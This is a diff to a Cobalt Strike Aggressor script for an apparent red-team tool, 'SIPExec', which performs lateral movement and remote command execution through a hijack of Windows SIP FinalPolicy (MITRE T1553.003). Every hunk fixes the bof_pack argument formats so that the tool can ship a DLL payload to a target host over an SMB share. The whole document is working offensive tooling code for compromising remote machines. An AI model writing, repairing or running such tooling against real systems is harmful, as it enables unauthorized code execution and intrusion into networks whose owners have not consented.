@@ -264,13 +264,12 @@ sub sipexec_jump_invoke {
 
     btask($bid, "SIPExec jump → $target via FinalPolicy hijack", "T1553.003");
 
-    # Pack: mode(short) target(z) command(z) dll_len(int) dll_data(z) dll_path_override(z) share(z) guid(z) no_cleanup(short)
-    $args = bof_pack($bid, "szzizbzzsss",
+    # Pack: mode(s) target(z) command(z) dll_data(b) dll_path_override(z) share(z) guid(z) no_cleanup(s)
+    $args = bof_pack($bid, "szzbzzzs",
         0,                   # mode = jump
         $target,             # target
         "",                  # command (empty for jump)
-        strlen($dll_data),   # dll_len
-        $dll_data,           # dll_data bytes
+        $dll_data,           # dll_data binary
         "",                  # dll_path_override (empty = upload)
         $share,              # share
         $guid,               # guid alias
@@ -352,12 +351,11 @@ alias tmb_sipexec_exec {
     if ($dll_path_override ne "") {
         btask($1, "SIPExec exec → $target (UNC: $dll_path_override)", "T1553.003");
         local('$args');
-        $args = bof_pack($1, "szzizzzzs",
+        $args = bof_pack($1, "szzbzzzs",
             1,                      # mode = exec
             $target,
             $command,
-            0,                      # dll_len = 0 (using path override)
-            "",                     # no dll_data
+            "",                     # dll_data empty (using UNC override)
             $dll_path_override,     # dll_path_override
             $share,
             $guid,
@@ -390,12 +388,11 @@ alias tmb_sipexec_exec {
 
     btask($1, "SIPExec exec → $target : $command", "T1553.003");
 
-    $args = bof_pack($1, "szzizzzss",
+    $args = bof_pack($1, "szzbzzzs",
         1,                   # mode = exec
         $target,
         $command,
-        strlen($dll_data),   # dll_len
-        $dll_data,           # dll_data bytes
+        $dll_data,           # dll_data binary
         "",                  # dll_path_override (empty = upload)
         $share,
         $guid,
